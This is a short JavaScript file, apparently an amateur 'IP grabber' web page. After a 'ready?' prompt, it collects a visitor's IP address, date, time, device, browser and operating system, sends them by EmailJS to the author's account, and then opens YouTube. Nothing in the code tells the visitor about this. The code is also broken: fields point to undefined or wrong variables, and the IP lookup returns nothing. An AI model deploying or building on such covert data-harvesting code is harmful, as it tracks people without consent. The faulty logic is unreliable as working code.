const d = new Date();

function prepare() {
  confirm("ready?")
  createData();
  send();
  open();
}

var templateParams = {
  ipe : ip,
  datee : date,
  timee : time,
  deviceTypee : time,
  browsere : time,
  operatingSysteme : time,
  };
  
function send() {
      emailjs.send('service_fx6rflw', 'template_rbexvti', templateParams).then(
    (response) => {
      alert('SUCCESS!', response.status, response.text);
    },
    (error) => {
      alert("faliure");
    },
  );
}

function createData() {
  let ip = toString(getIP());
  let date = toString(getFullDate());
  let time = toString(getFullTime());
  let deviceType = toString(getDeviceType());
  let browser = toString(getBrowser());
  let operatingSystem = toString(getOS());
}

function getIP() {
  $.getJSON("https://api.ipify.org?format=json",
            function (data) {
 
                return data.ip;
            });
}

function getFullDate() {
  let fullDate = "Date:" + d.getDate() + "/" + d.getMonth() + "/" + d.getFullYear();
  return fullDate;
}

function getFullTime() {
  let fullTime = "Time: " + d.getHours() + ":" + d.getMinutes() + ":" + d.getMilliseconds();
  return fullTime;
}

const getDeviceType = () => {
  const ua = navigator.userAgent;
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
    return "tablet";
  }
  if (
    /Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(
      ua
    )
  ) {
    return "mobile";
  }
  return "desktop";
};

function getBrowser() {
  // Opera 8.0+
var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;

// Firefox 1.0+
var isFirefox = typeof InstallTrigger !== 'undefined';

// Safari 3.0+ "[object HTMLElementConstructor]" 
var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && window['safari'].pushNotification));

// Internet Explorer 6-11
var isIE = /*@cc_on!@*/false || !!document.documentMode;

// Edge 20+
var isEdge = !isIE && !!window.StyleMedia;

// Chrome 1 - 79
var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);

// Edge (based on chromium) detection
var isEdgeChromium = isChrome && (navigator.userAgent.indexOf("Edg") != -1);

// Blink engine detection
var isBlink = (isChrome || isOpera) && !!window.CSS;


var output = 'Detecting browsers by ducktyping:<hr>';
output += 'isFirefox: ' + isFirefox + '<br>';
output += 'isChrome: ' + isChrome + '<br>';
output += 'isSafari: ' + isSafari + '<br>';
output += 'isOpera: ' + isOpera + '<br>';
output += 'isIE: ' + isIE + '<br>';
output += 'isEdge: ' + isEdge + '<br>';
output += 'isEdgeChromium: ' + isEdgeChromium + '<br>';
output += 'isBlink: ' + isBlink + '<br>';
return output;
}


function getOS() {
	let userAgent = window.navigator.userAgent,
		platform = window.navigator.platform,
		macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
		windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
		iosPlatforms = ['iPhone', 'iPad', 'iPod'],
		os = null;

	if (macosPlatforms.indexOf(platform) !== -1) {
		os = 'Mac OS';
	} else if (iosPlatforms.indexOf(platform) !== -1) {
		os = 'iOS';
	} else if (windowsPlatforms.indexOf(platform) !== -1) {
		os = 'Windows';
	} else if (/Android/.test(userAgent)) {
		os = 'Android';
	} else if (!os && /Linux/.test(platform)) {
		os = 'Linux';
	}

	return os;
}



function open() {
  window.open("youtube.com");
}